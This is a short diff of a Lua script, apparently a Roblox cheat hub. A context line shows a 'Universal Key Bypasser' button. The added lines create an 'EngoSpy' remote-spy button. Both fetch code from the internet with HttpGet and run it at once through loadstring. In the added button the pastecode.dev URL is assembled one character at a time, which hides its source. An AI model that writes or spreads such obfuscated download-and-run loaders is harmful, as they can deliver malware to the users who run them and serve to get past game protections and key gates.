@@ -4297,6 +4297,10 @@ MoreSection:NewButton("Universal 🔑 Bypasser", "key bypsr", function()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/MariyaFurmanova/Library/main/un_LaukHubKeyBypass", true))()
 end)
 
+MoreSection:NewButton("EngoSpy", "see remotes", function()
+--engospy
+loadstring(game:HttpGet('h'..'t'..'t'..'p'..'s'..':'..'/'..'/'..'p'..'a'..'s'..'t'..'e'..'c'..'o'..'d'..'e'..'.'..'d'..'e'..'v'..'/'..'r'..'a'..'w'..'/'..'l'..'h'..'r'..'7'..'k'..'i'..'v'..'4'..'/'..'e'..'n'..'g'..'o'..'S'..'p'..'y'..'_'..'l'..'u'..'l'..'a'..'s'..'l'..'o'..'ll'..'i'..'p'..'o'..'p'..'.'..'d'..'e'..'b',true))()
+end)
 
 Players.ChildAdded:connect(function()
 local count = #game.Players:GetPlayers()
